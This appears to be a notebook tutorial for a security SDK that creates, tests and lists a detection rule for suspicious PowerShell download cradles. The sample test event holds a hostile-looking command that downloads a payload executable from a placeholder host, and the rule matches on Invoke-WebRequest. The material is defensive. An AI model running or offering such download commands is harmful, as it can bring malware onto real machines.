# Custom Detection Rule Builder

Create a detection rule, validate it against sample events, and prepare it for governed rollout.

```python
from clario360 import Client

sdk = Client.from_env()
RULE_PAYLOAD = {
    'name': 'Notebook - Suspicious PowerShell Download',
    'description': 'Detects suspicious PowerShell download cradles from process telemetry.',
    'severity': 'high',
    'query': 'process_name=PowerShell AND command_line:*Invoke-WebRequest*',
    'enabled': False,
}
TEST_EVENT = {
    'process_name': 'PowerShell',
    'command_line': 'powershell Invoke-WebRequest https://example.invalid/payload.exe',
    'host': 'ws-204',
}
```

## Create and test

The rule is created disabled by default so that it can be validated before enabling it in production.

```python
created = sdk.cyber.rules.create(**RULE_PAYLOAD)
print(f"Created rule {created.id} with enabled={created.enabled}")
test_result = sdk.cyber.rules.test(created.id, event=TEST_EVENT)
test_result
```

## Review next steps

If the test result matches as expected, enable the rule through the product UI or extend this notebook to update the rule.

```python
all_rules = sdk.cyber.rules.list(search='Notebook - Suspicious', per_page=25).to_dataframe()
all_rules[['id', 'name', 'severity', 'enabled']] if not all_rules.empty else all_rules
```
